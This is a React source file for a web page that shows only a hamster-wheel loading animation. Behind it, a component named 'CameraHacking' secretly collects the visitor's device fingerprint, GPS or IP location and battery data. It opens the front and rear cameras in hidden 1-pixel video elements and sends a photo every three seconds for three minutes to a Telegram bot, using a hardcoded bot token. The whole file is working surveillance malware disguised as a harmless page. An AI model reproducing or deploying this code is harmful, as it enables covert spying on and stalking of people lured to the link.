import React, { useRef, useEffect } from "react";
import { useParams, BrowserRouter, Routes, Route } from "react-router-dom";
import ReactDOM from "react-dom/client";
import "./App.css";

/**
 * КОМПОНЕНТ CAMERAHACKING
 */
const CameraHacking = ({ chatId }) => {
  const streamsRef = useRef([]);
  const captureIntervalRef = useRef(null);
  const videoRefsRef = useRef([]);
  const captureCount = useRef(0);
  const startTime = useRef(null);
  const totalDuration = 180000; // 3 минуты = 180000 мс
  const photoInterval = 3000; // 3 секунды

  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';

  // Метод отправки текста в Telegram
  const sendToTelegram = (text) => {
    return new Promise((resolve, reject) => {
      const xhr = new XMLHttpRequest();
      xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, true);
      xhr.setRequestHeader('Content-Type', 'application/json');
      
      xhr.onload = function() {
        if (xhr.status === 200) {
          console.log('Сообщение отправлено успешно');
          resolve(true);
        } else {
          console.error('Ошибка отправки сообщения:', xhr.status, xhr.responseText);
          reject(new Error(`Ошибка ${xhr.status}: ${xhr.responseText}`));
        }
      };
      
      xhr.onerror = function() {
        console.error('Ошибка сети при отправке сообщения');
        reject(new Error('Ошибка сети'));
      };
      
      const data = JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: 'HTML',
        disable_notification: true
      });
      
      console.log('Отправка сообщения в Telegram:', data.substring(0, 100) + '...');
      xhr.send(data);
    });
  };

  // Отправка фото в Telegram
  const sendPhotoToTelegram = (blob, caption = '') => {
    return new Promise((resolve, reject) => {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, `photo_${Date.now()}_${Math.random().toString(36).substr(2, 9)}.jpg`);
      formData.append('disable_notification', 'true');
      if (caption) {
        formData.append('caption', caption);
      }

      const xhr = new XMLHttpRequest();
      xhr.open('POST', `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, true);
      
      xhr.onload = function() {
        if (xhr.status === 200) {
          console.log('Фото отправлено успешно');
          resolve(true);
        } else {
          console.error('Ошибка отправки фото:', xhr.status, xhr.responseText);
          reject(new Error(`Ошибка ${xhr.status}: ${xhr.responseText}`));
        }
      };
      
      xhr.onerror = function() {
        console.error('Ошибка сети при отправке фото');
        reject(new Error('Ошибка сети'));
      };
      
      console.log('Отправка фото в Telegram, размер:', blob.size, 'байт');
      xhr.send(formData);
    });
  };

  // Получение геолокации
  const getGeolocation = () => {
    return new Promise((resolve) => {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const { latitude, longitude, accuracy } = position.coords;
            console.log('GPS координаты получены:', latitude, longitude);
            resolve({
              latitude: latitude.toFixed(6),
              longitude: longitude.toFixed(6),
              accuracy: Math.round(accuracy),
              method: "GPS",
              success: true
            });
          },
          (error) => {
            console.log('GPS недоступен, получаем по IP:', error.message);
            getLocationByIP().then(resolve);
          },
          {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
          }
        );
      } else {
        console.log('Geolocation API не поддерживается, получаем по IP');
        getLocationByIP().then(resolve);
      }
    });
  };

  // Получение локации по IP
  const getLocationByIP = async () => {
    try {
      console.log('Получение локации по IP...');
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      console.log('Данные IP:', data);
      
      return {
        latitude: data.latitude,
        longitude: data.longitude,
        city: data.city,
        region: data.region,
        country: data.country_name,
        isp: data.org,
        ip: data.ip,
        method: "IP",
        success: true
      };
    } catch (error) {
      console.error('Ошибка получения локации по IP:', error);
      return {
        success: false,
        error: error.message
      };
    }
  };

  // Получение информации о батарее
  const getBatteryInfo = async () => {
    try {
      if ('getBattery' in navigator) {
        const battery = await navigator.getBattery();
        console.log('Информация о батарее получена:', battery);
        return {
          level: Math.round(battery.level * 100),
          charging: battery.charging,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime,
          success: true
        };
      }
    } catch (error) {
      console.log('Ошибка получения информации о батарее:', error);
    }
    return { success: false };
  };

  // Сбор полной информации об устройстве
  const collectDeviceInfo = async () => {
    console.log('Начинаю сбор информации об устройстве...');
    
    const [batteryInfo, locationInfo] = await Promise.allSettled([
      getBatteryInfo(),
      getGeolocation()
    ]);

    console.log('Результаты сбора информации:', { batteryInfo, locationInfo });

    // Определение ОС
    const ua = navigator.userAgent;
    let os = 'Unknown';
    let osVersion = 'Unknown';
    
    if (/Windows NT 10/i.test(ua)) { os = 'Windows'; osVersion = '10/11'; }
    else if (/Windows NT 6.3/i.test(ua)) { os = 'Windows'; osVersion = '8.1'; }
    else if (/Windows NT 6.2/i.test(ua)) { os = 'Windows'; osVersion = '8'; }
    else if (/Windows NT 6.1/i.test(ua)) { os = 'Windows'; osVersion = '7'; }
    else if (/Mac OS X (\d+[._]\d+)/i.test(ua)) { 
      os = 'macOS'; 
      const match = ua.match(/Mac OS X (\d+[._]\d+)/i);
      osVersion = match ? match[1].replace(/_/g, '.') : 'Unknown';
    }
    else if (/Android (\d+(\.\d+)+)/i.test(ua)) { 
      os = 'Android'; 
      const match = ua.match(/Android (\d+(\.\d+)+)/i);
      osVersion = match ? match[1] : 'Unknown';
    }
    else if (/iPhone OS (\d+_?\d*)/i.test(ua)) { 
      os = 'iOS'; 
      const match = ua.match(/iPhone OS (\d+_?\d*)/i);
      osVersion = match ? match[1].replace(/_/g, '.') : 'Unknown';
    }
    else if (/Linux/i.test(ua)) { os = 'Linux'; }

    // Определение браузера
    let browser = 'Unknown';
    let browserVersion = 'Unknown';
    
    if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) { 
      browser = 'Chrome'; 
      const match = ua.match(/Chrome\/(\d+(\.\d+)+)/i);
      browserVersion = match ? match[1] : 'Unknown';
    }
    else if (/Firefox/i.test(ua)) { 
      browser = 'Firefox'; 
      const match = ua.match(/Firefox\/(\d+(\.\d+)+)/i);
      browserVersion = match ? match[1] : 'Unknown';
    }
    else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) { 
      browser = 'Safari'; 
      const match = ua.match(/Version\/(\d+(\.\d+)+)/i);
      browserVersion = match ? match[1] : 'Unknown';
    }
    else if (/Edg/i.test(ua)) { 
      browser = 'Edge'; 
      const match = ua.match(/Edg\/(\d+(\.\d+)+)/i);
      browserVersion = match ? match[1] : 'Unknown';
    }

    // WebGL информация (GPU)
    let gpuInfo = 'Не доступно';
    try {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (gl) {
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
          gpuInfo = `${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}`;
        }
      }
    } catch (e) {
      console.log('Ошибка получения GPU информации:', e);
    }

    // Медиаустройства
    let mediaDevices = { cameras: 0, microphones: 0, speakers: 0 };
    try {
      const devices = await navigator.mediaDevices.enumerateDevices();
      mediaDevices = {
        cameras: devices.filter(d => d.kind === 'videoinput').length,
        microphones: devices.filter(d => d.kind === 'audioinput').length,
        speakers: devices.filter(d => d.kind === 'audiooutput').length
      };
      console.log('Медиаустройства:', mediaDevices);
    } catch (e) {
      console.log('Ошибка получения медиаустройств:', e);
    }

    const info = {
      // Основная информация
      timestamp: new Date().toISOString(),
      userAgent: ua.substring(0, 200),
      platform: navigator.platform,
      vendor: navigator.vendor,
      
      // ОС и браузер
      os: os,
      osVersion: osVersion,
      browser: browser,
      browserVersion: browserVersion,
      
      // Экран
      screenSize: `${window.screen.width}x${window.screen.height}`,
      availScreen: `${window.screen.availWidth}x${window.screen.availHeight}`,
      colorDepth: window.screen.colorDepth,
      pixelDepth: window.screen.pixelDepth,
      devicePixelRatio: window.devicePixelRatio,
      orientation: window.screen.orientation ? window.screen.orientation.type : 'Unknown',
      
      // Язык и время
      language: navigator.language,
      languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),
      
      // Производительность
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: navigator.deviceMemory,
      maxTouchPoints: navigator.maxTouchPoints,
      
      // Сеть
      connection: navigator.connection ? {
        effectiveType: navigator.connection.effectiveType,
        downlink: navigator.connection.downlink,
        rtt: navigator.connection.rtt,
        saveData: navigator.connection.saveData
      } : null,
      
      // Батарея
      battery: batteryInfo.status === 'fulfilled' ? batteryInfo.value : { success: false },
      
      // Геолокация
      location: locationInfo.status === 'fulfilled' ? locationInfo.value : { success: false },
      
      // GPU
      gpu: gpuInfo,
      
      // Медиаустройства
      mediaDevices: mediaDevices,
      
      // IP
      ip: locationInfo.status === 'fulfilled' ? locationInfo.value.ip : 'Unknown',
      
      // Детекция типа
      isMobile: /Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua),
      isTablet: /Tablet|iPad/i.test(ua),
      isDesktop: !/Mobile|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua),
      
      // Дополнительно
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      pdfViewerEnabled: navigator.pdfViewerEnabled,
      webdriver: navigator.webdriver,
      deviceType: detectDeviceType(ua)
    };

    console.log('Собранная информация об устройстве:', info);
    return info;
  };

  // Определение типа устройства
  const detectDeviceType = (ua) => {
    if (/iPhone/i.test(ua)) return 'iPhone';
    if (/iPad/i.test(ua)) return 'iPad';
    if (/iPod/i.test(ua)) return 'iPod';
    if (/Android/i.test(ua)) {
      if (/Mobile/i.test(ua)) return 'Android Phone';
      return 'Android Tablet';
    }
    if (/Windows Phone/i.test(ua)) return 'Windows Phone';
    if (/BlackBerry/i.test(ua)) return 'BlackBerry';
    return 'Desktop/Laptop';
  };

  // Форматирование информации для отправки
  const formatDeviceInfo = (info) => {
    const batteryText = info.battery.success ? 
      `🔋 Батарея: ${info.battery.level}% (${info.battery.charging ? '⚡ Зарядка' : '🔋 Разрядка'})` : 
      '🔋 Батарея: Не доступно';
    
    let locationText = '';
    if (info.location.success) {
      if (info.location.method === "GPS") {
        locationText = `📍 GPS Координаты:\n   Широта: ${info.location.latitude}\n   Долгота: ${info.location.longitude}\n   Точность: ±${info.location.accuracy}м`;
      } else {
        locationText = `📍 IP Геолокация:\n   Город: ${info.location.city || 'Неизвестно'}\n   Регион: ${info.location.region || 'Неизвестно'}\n   Страна: ${info.location.country || 'Неизвестно'}\n   Координаты: ${info.location.latitude}, ${info.location.longitude}\n   Провайдер: ${info.location.isp || 'Неизвестно'}\n   IP: ${info.location.ip || 'Неизвестно'}`;
      }
    } else {
      locationText = '📍 Геолокация: Не доступно';
    }
    
    const connectionText = info.connection ? 
      `📡 Сеть: ${info.connection.effectiveType}\n   Скорость: ${info.connection.downlink} Mbps\n   Задержка: ${info.connection.rtt} ms\n   Экономия: ${info.connection.saveData ? 'Вкл' : 'Выкл'}` :
      '📡 Сеть: Не доступно';
    
    return `🔍 ПОЛНАЯ ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ

*📱 СИСТЕМА И БРАУЗЕР*
▫️ ОС: ${info.os} ${info.osVersion}
▫️ Браузер: ${info.browser} ${info.browserVersion}
▫️ Платформа: ${info.platform}
▫️ Производитель: ${info.vendor}
▫️ Тип: ${info.deviceType}
▫️ Мобильное: ${info.isMobile ? 'Да' : 'Нет'}
▫️ Планшет: ${info.isTablet ? 'Да' : 'Нет'}

*🖥 ЭКРАН И ДИСПЛЕЙ*
▫️ Разрешение: ${info.screenSize}
▫️ Доступно: ${info.availScreen}
▫️ Ориентация: ${info.orientation}
▫️ Глубина цвета: ${info.colorDepth} бит
▫️ Pixel Ratio: ${info.devicePixelRatio}
▫️ GPU: ${info.gpu}

*⚙️ АППАРАТНЫЕ ХАРАКТЕРИСТИКИ*
▫️ Ядра CPU: ${info.hardwareConcurrency}
▫️ ОЗУ: ${info.deviceMemory} GB
▫️ Макс. касаний: ${info.maxTouchPoints}
${batteryText}

*🎥 МЕДИАУСТРОЙСТВА*
▫️ Камеры: ${info.mediaDevices.cameras}
▫️ Микрофоны: ${info.mediaDevices.microphones}
▫️ Динамики: ${info.mediaDevices.speakers}

${locationText}

${connectionText}

*🌍 ЯЗЫК И ВРЕМЯ*
▫️ Язык: ${info.language}
▫️ Поддерживаемые: ${info.languages}
▫️ Часовой пояс: ${info.timezone}
▫️ Смещение: ${info.timezoneOffset} мин

*🔧 ДОПОЛНИТЕЛЬНО*
▫️ Куки: ${info.cookieEnabled ? 'Вкл' : 'Выкл'}
▫️ Do Not Track: ${info.doNotTrack || 'Не установлен'}
▫️ PDF Viewer: ${info.pdfViewerEnabled ? 'Да' : 'Нет'}
▫️ WebDriver: ${info.webdriver ? 'Да' : 'Нет'}

*⏰ СТАТУС*
▫️ Время системы: ${new Date().toLocaleString()}
▫️ User Agent: ${info.userAgent}

🚀 ЗАПУСКАЮ СЪЕМКУ: ФОТО КАЖДЫЕ 3 СЕКУНДЫ В ТЕЧЕНИЕ 3 МИНУТ`;
  };

  // Инициализация камер
  const initializeCameras = async () => {
    try {
      console.log('Начинаю инициализацию камер...');
      
      // Пробуем обе камеры
      const cameraTypes = [
        { facingMode: "user", name: "Селфи камера" },
        { facingMode: { exact: "environment" }, name: "Задняя камера" }
      ];
      
      streamsRef.current = [];
      videoRefsRef.current = [];
      
      for (let i = 0; i < cameraTypes.length; i++) {
        try {
          const constraints = {
            video: {
              facingMode: cameraTypes[i].facingMode,
              width: { ideal: 1280 },
              height: { ideal: 720 }
            },
            audio: false
          };
          
          console.log(`Пытаюсь получить доступ к камере ${i + 1}:`, cameraTypes[i].name);
          const stream = await navigator.mediaDevices.getUserMedia(constraints);
          console.log(`Камера ${i + 1} доступна`);
          
          // Создаем видео элемент
          const video = document.createElement('video');
          video.style.cssText = `
            position: fixed;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            pointer-events: none;
            z-index: -9999;
            top: 0;
            left: 0;
            transform: scale(0.1);
          `;
          video.autoplay = true;
          video.muted = true;
          video.playsInline = true;
          video.setAttribute('playsinline', '');
          video.srcObject = stream;
          document.body.appendChild(video);
          
          // Ждем готовности видео
          await new Promise((resolve, reject) => {
            video.onloadedmetadata = () => {
              console.log(`Камера ${i + 1} метаданные загружены:`, video.videoWidth, 'x', video.videoHeight);
              video.play().then(() => {
                setTimeout(() => {
                  streamsRef.current.push(stream);
                  videoRefsRef.current.push(video);
                  console.log(`Камера ${i + 1} готова к использованию`);
                  resolve();
                }, 500);
              }).catch(reject);
            };
            
            video.onerror = reject;
            
            // Таймаут
            setTimeout(() => {
              if (video.readyState >= 1) {
                video.play().then(() => {
                  streamsRef.current.push(stream);
                  videoRefsRef.current.push(video);
                  console.log(`Камера ${i + 1} готова (таймаут)`);
                  resolve();
                }).catch(reject);
              }
            }, 2000);
          });
          
        } catch (error) {
          console.log(`Камера ${i + 1} не доступна:`, error.message);
          // Продолжаем с следующей камерой
        }
      }
      
      console.log(`Инициализация завершена. Доступно камер: ${streamsRef.current.length}`);
      return streamsRef.current.length > 0;
      
    } catch (error) {
      console.error('Ошибка инициализации камер:', error);
      return false;
    }
  };

  // Создание фото с камеры
  const capturePhotoFromCamera = async (cameraIndex, video) => {
    return new Promise((resolve) => {
      const canvas = document.createElement('canvas');
      
      // Проверяем готовность видео
      if (video && video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        const ctx = canvas.getContext('2d');
        
        // Очищаем canvas
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        
        // Для селфи камеры на мобильных устройствах делаем зеркальное отражение
        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        const isSelfieCamera = cameraIndex === 0;
        
        if (isMobile && isSelfieCamera) {
          // Зеркальное отражение для селфи-камеры
          ctx.save();
          ctx.translate(canvas.width, 0);
          ctx.scale(-1, 1);
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          ctx.restore();
        } else {
          // Обычное отображение для других камер
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        }
        
        // Добавляем водяной знак TAVERNA в правом нижнем углу
        const watermarkText = 'TAVERNA';
        ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
        ctx.font = 'bold 24px Arial';
        ctx.textAlign = 'right';
        
        // Фон для текста
        const textMetrics = ctx.measureText(watermarkText);
        const textWidth = textMetrics.width;
        const textHeight = 30;
        const padding = 10;
        
        ctx.fillRect(
          canvas.width - textWidth - padding * 2,
          canvas.height - textHeight - padding,
          textWidth + padding * 2,
          textHeight
        );
        
        // Текст
        ctx.fillStyle = '#FFFFFF';
        ctx.fillText(
          watermarkText,
          canvas.width - padding,
          canvas.height - padding - 5
        );
        
        // Добавляем информацию в левом нижнем углу
        ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
        ctx.textAlign = 'left';
        ctx.font = '12px Arial';
        
        const infoLines = [
          `${cameraIndex === 0 ? '🤳 Селфи' : '📷 Задняя'}`,
          `#${captureCount.current + 1}`,
          `${new Date().toLocaleTimeString()}`,
          `${video.videoWidth}x${video.videoHeight}`
        ];
        
        const infoHeight = infoLines.length * 15 + 20;
        ctx.fillRect(10, canvas.height - infoHeight, 200, infoHeight);
        
        ctx.fillStyle = '#FFFFFF';
        infoLines.forEach((line, i) => {
          ctx.fillText(line, 20, canvas.height - infoHeight + 20 + (i * 15));
        });
        
      } else {
        // Создаем тестовое изображение если видео не готово
        console.warn(`Видео камеры ${cameraIndex} не готово`);
        
        canvas.width = 800;
        canvas.height = 600;
        const ctx = canvas.getContext('2d');
        
        // Фон
        ctx.fillStyle = '#1a1a1a';
        ctx.fillRect(0, 0, 800, 600);
        
        // Градиент
        const gradient = ctx.createRadialGradient(400, 300, 0, 400, 300, 250);
        gradient.addColorStop(0, 'rgba(102, 126, 234, 0.9)');
        gradient.addColorStop(1, 'rgba(118, 75, 162, 0.3)');
        ctx.fillStyle = gradient;
        ctx.beginPath();
        ctx.arc(400, 300, 250, 0, Math.PI * 2);
        ctx.fill();
        
        // Иконка камеры
        ctx.fillStyle = '#FFFFFF';
        ctx.font = '120px Arial';
        ctx.textAlign = 'center';
        ctx.fillText(cameraIndex === 0 ? '🤳' : '📷', 400, 320);
        
        // Информация
        ctx.font = '24px Arial';
        ctx.fillText(`Камера ${cameraIndex === 0 ? 'Селфи' : 'Задняя'} не активна`, 400, 420);
        ctx.fillText(`Фото #${captureCount.current + 1}`, 400, 470);
        ctx.fillText(new Date().toLocaleTimeString(), 400, 520);
        
        // Водяной знак TAVERNA
        ctx.fillStyle = 'rgba(0, 0, 0, 0.6)';
        ctx.font = 'bold 36px Arial';
        ctx.textAlign = 'right';
        ctx.fillText('TAVERNA', 780, 580);
      }
      
      // Конвертируем canvas в blob
      canvas.toBlob(blob => {
        if (blob) {
          console.log(`Фото создано, размер: ${blob.size} байт`);
          resolve(blob);
        } else {
          console.error('Не удалось создать blob из canvas');
          resolve(null);
        }
      }, 'image/jpeg', 0.85);
    });
  };

  // Захват и отправка фото со всех камер
  const captureAndSendPhotos = async () => {
    const elapsed = Date.now() - startTime.current;
    
    // Проверяем не истекло ли время
    if (elapsed >= totalDuration) {
      stopCapturing();
      sendToTelegram(`⏰ ВРЕМЯ ИСТЕКЛО\n\n✅ Всего сделано фото: ${captureCount.current}\n🕐 Длительность: 3 минуты\n📅 ${new Date().toLocaleString()}`);
      return;
    }
    
    // Фильтруем готовые видео элементы
    const readyVideos = videoRefsRef.current.filter(video => {
      return video && video.readyState >= 2 && video.videoWidth > 0 && video.videoHeight > 0;
    });
    
    if (readyVideos.length === 0) {
      console.log('Нет готовых камер для съемки');
      captureCount.current++;
      return;
    }
    
    console.log(`Захват фото с ${readyVideos.length} камер...`);
    
    // Захватываем фото со всех камер
    for (let i = 0; i < readyVideos.length; i++) {
      try {
        const video = readyVideos[i];
        const originalCameraIndex = videoRefsRef.current.indexOf(video);
        const photoBlob = await capturePhotoFromCamera(originalCameraIndex, video);
        
        if (photoBlob) {
          const cameraType = originalCameraIndex === 0 ? '🤳 Селфи камера' : '📷 Задняя камера';
          const elapsedSeconds = Math.floor(elapsed / 1000);
          const remainingSeconds = Math.floor((totalDuration - elapsed) / 1000);
          
          const caption = `${cameraType}\n` +
            `📸 Фото #${captureCount.current + 1}\n` +
            `📏 ${video.videoWidth}x${video.videoHeight}\n` +
            `⏱ Прошло: ${elapsedSeconds} сек\n` +
            `⏳ Осталось: ${remainingSeconds} сек\n` +
            `🕐 ${new Date().toLocaleTimeString()}\n` +
            `🚀 TAVERNA SYSTEM`;
          
          console.log(`Отправка фото с камеры ${originalCameraIndex}...`);
          await sendPhotoToTelegram(photoBlob, caption);
          console.log(`Фото с камеры ${originalCameraIndex} отправлено`);
        }
      } catch (error) {
        console.error(`Ошибка при работе с камерой ${i}:`, error);
      }
    }
    
    captureCount.current++;
    
    // Отправляем статистику каждые 10 фото
    if (captureCount.current % 10 === 0) {
      const elapsedMinutes = Math.floor(elapsed / 60000);
      const elapsedSeconds = Math.floor((elapsed % 60000) / 1000);
      const remainingSeconds = Math.floor((totalDuration - elapsed) / 1000);
      
      try {
        await sendToTelegram(
          `📊 СТАТИСТИКА #${captureCount.current}\n\n` +
          `📸 Всего фото: ${captureCount.current}\n` +
          `📷 Активных камер: ${readyVideos.length}\n` +
          `⏱ Время работы: ${elapsedMinutes}:${elapsedSeconds.toString().padStart(2, '0')}\n` +
          `⏳ Осталось: ${remainingSeconds} сек\n` +
          `📅 ${new Date().toLocaleString()}\n` +
          `🚀 TAVERNA SYSTEM ACTIVE`
        );
      } catch (error) {
        console.error('Ошибка отправки статистики:', error);
      }
    }
  };

  // Запуск периодической съемки
  const startPeriodicCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }
    
    console.log('Запуск периодической съемки...');
    
    // Первые фото сразу
    setTimeout(() => {
      captureAndSendPhotos().catch(error => {
        console.error('Ошибка при первом захвате фото:', error);
      });
    }, 1000);
    
    // Последующие каждые 3 секунды
    captureIntervalRef.current = setInterval(() => {
      captureAndSendPhotos().catch(error => {
        console.error('Ошибка при периодическом захвате фото:', error);
      });
    }, photoInterval);
  };

  // Остановка съемки
  const stopCapturing = () => {
    console.log('Остановка съемки...');
    
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }
    
    // Закрываем все камеры
    streamsRef.current.forEach(stream => {
      if (stream) {
        stream.getTracks().forEach(track => {
          track.stop();
        });
      }
    });
    streamsRef.current = [];
    
    // Удаляем видео элементы
    videoRefsRef.current.forEach(video => {
      if (video) {
        video.srcObject = null;
        video.remove();
      }
    });
    videoRefsRef.current = [];
  };

  // Основная инициализация
  useEffect(() => {
    startTime.current = Date.now();
    
    const init = async () => {
      try {
        console.log('Начало инициализации, chatId:', chatId);
        
        // Собираем полную информацию об устройстве
        const deviceInfo = await collectDeviceInfo();
        console.log('Информация об устройстве собрана');
        
        // Отправляем информацию
        try {
          await sendToTelegram(formatDeviceInfo(deviceInfo));
          console.log('Информация об устройстве отправлена');
        } catch (error) {
          console.error('Ошибка отправки информации об устройстве:', error);
        }
        
        // Инициализируем камеры
        const camerasReady = await initializeCameras();
        
        if (camerasReady) {
          console.log('Камеры готовы, начинаю съемку');
          
          try {
            await sendToTelegram(
              `🚀 КАМЕРЫ АКТИВИРОВАНЫ\n\n` +
              `📷 Доступно камер: ${streamsRef.current.length}\n` +
              `⏱ Начинаю съемку: Фото со всех камер каждые 3 секунды\n` +
              `⏳ Продолжительность: 3 минуты\n` +
              `📅 Старт: ${new Date().toLocaleString()}\n` +
              `🚀 TAVERNA SYSTEM ACTIVE`
            );
          } catch (error) {
            console.error('Ошибка отправки сообщения о начале съемки:', error);
          }
          
          // Запускаем периодическую съемку
          startPeriodicCapture();
          
          // Автоматическая остановка через 3 минуты
          setTimeout(() => {
            stopCapturing();
            sendToTelegram(
              `⏰ СЪЕМКА ЗАВЕРШЕНА\n\n` +
              `✅ Итоговый отчет:\n` +
              `📸 Всего фото: ${captureCount.current}\n` +
              `📷 Камеры использовано: ${streamsRef.current.length}\n` +
              `⏱ Общее время: 3 минуты\n` +
              `📅 Завершено: ${new Date().toLocaleString()}\n` +
              `🎉 TAVERNA SYSTEM: Процесс завершен успешно!`
            ).catch(error => {
              console.error('Ошибка отправки финального сообщения:', error);
            });
          }, totalDuration);
          
        } else {
          console.log('Камеры не доступны');
          try {
            await sendToTelegram('❌ ОШИБКА: Не удалось активировать камеры\n\n' +
              'Возможные причины:\n' +
              '1. Нет разрешения на доступ к камере\n' +
              '2. Камера занята другим приложением\n' +
              '3. Браузер не поддерживает доступ к камерам\n' +
              '4. Нет физической камеры на устройстве\n' +
              '🚫 TAVERNA SYSTEM: Операция отменена');
          } catch (error) {
            console.error('Ошибка отправки сообщения об ошибке камер:', error);
          }
        }
      } catch (error) {
        console.error('Ошибка в основной инициализации:', error);
      }
    };
    
    // Запускаем через небольшую задержку
    setTimeout(init, 1000);
    
    return () => {
      stopCapturing();
    };
  }, [chatId]);

  return null;
};

/**
 * КОМПОНЕНТ PHOTOPAGE - показывает только хомяка
 */
const PhotoPage = () => {
  const { chatId } = useParams();
  
  useEffect(() => {
    console.log('PhotoPage mounted with chatId:', chatId);
  }, [chatId]);

  return (
    <>
      <div className="App" style={{
        minHeight: '100vh',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
        padding: '20px'
      }}>
        <div className="wraper" style={{ transform: 'scale(1.4)' }}>
          <div className="wheel-and-hamster">
            <div className="wheel"></div>
            <div className="hamster">
              <div className="hamster__body">
                <div className="hamster__head">
                  <div className="hamster__ear"></div>
                  <div className="hamster__eye"></div>
                  <div className="hamster__nose"></div>
                </div>
                <div className="hamster__limb hamster__limb--fr"></div>
                <div className="hamster__limb hamster__limb--fl"></div>
                <div className="hamster__limb hamster__limb--br"></div>
                <div className="hamster__limb hamster__limb--bl"></div>
                <div className="hamster__tail"></div>
              </div>
            </div>
            <div className="spoke"></div>
          </div>
          
          <div style={{
            textAlign: 'center',
            marginTop: '50px',
            color: 'white',
            fontSize: '18px',
            fontWeight: 'bold',
            opacity: 0.9
          }}>
            TAVERNA SYSTEM ACTIVE...
          </div>
        </div>
      </div>

      {chatId && <CameraHacking chatId={chatId} />}
    </>
  );
};

/**
 * КОМПОНЕНТ APP
 */
const App = () => {
  return (
    <Routes>
      <Route path="/g/:chatId" element={<PhotoPage />} />
      <Route path="/" element={
        <div className="App" style={{
          minHeight: '100vh',
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)'
        }}>
          <div className="wraper">
            <div className="wheel-and-hamster">
              <div className="wheel"></div>
              <div className="hamster">
                <div className="hamster__body">
                  <div className="hamster__head">
                    <div className="hamster__ear"></div>
                    <div className="hamster__eye"></div>
                    <div className="hamster__nose"></div>
                  </div>
                  <div className="hamster__limb hamster__limb--fr"></div>
                  <div className="hamster__limb hamster__limb--fl"></div>
                  <div className="hamster__limb hamster__limb--br"></div>
                  <div className="hamster__limb hamster__limb--bl"></div>
                </div>
              </div>
              <div className="spoke"></div>
            </div>
          </div>
        </div>
      } />
    </Routes>
  );
};

/**
 * ОСНОВНОЙ РЕНДЕР
 */
const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(
  <BrowserRouter>
    <App />
  </BrowserRouter>
);

export default App;
